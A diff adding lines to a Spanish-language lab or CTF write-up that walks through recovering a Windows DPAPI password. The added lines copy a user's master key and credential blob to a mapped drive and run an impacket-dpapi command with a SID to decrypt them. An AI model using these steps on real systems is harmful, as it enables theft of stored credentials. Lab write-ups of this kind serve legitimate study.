@@ -260,4 +260,7 @@ Para poder verla necesitamos traernos a nuestro sistema las master keys: `C:\Use
 
 Esto nos permite obtener una clave que nos permite descifrar el contenido de la credentialBLob `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9` y ver la contraseña en texto claro.
 
-Nos tendremos que traer las dos con
+Nos tendremos que traer las dos con `copy <ruta> z:\masterkey_blob` y ahora `copy <ruta> z:\credential_blob`
+
+Usaremos [[impacket-dpapi]] podemos derivar la clave para descifrar la masterkey para obtener una clave que nos permita descifrar el credential_blob
+`impacket-dpapi masterkey -fi masterkey_blob -sid S-1-5-21-1487982659-1829050783-2281216199-1107`
